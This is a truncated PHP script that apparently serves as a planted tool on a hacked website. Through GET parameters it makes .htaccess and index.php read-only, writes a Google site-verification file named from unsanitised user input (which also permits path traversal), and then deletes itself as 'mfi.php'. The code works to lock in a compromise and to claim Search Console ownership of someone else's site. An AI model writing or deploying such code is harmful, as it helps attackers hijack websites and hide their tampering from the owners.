<?php
if(isset($_GET['chmod']) &&  $_GET['chmod'] == '1'){
        chmod('.htaccess',0444);
        chmod('index.php',0444);
        echo 'chmod is ok';
}
if(isset($_GET['write']) && trim($_GET['write'])){
        $write = trim($_GET['write']);
        $path ='./'. $write.'.html';
        $content='google-site-verification: '.$write.'.html';
        file_put_contents($path,$content);
        echo $content;
        unlink('mfi.php');
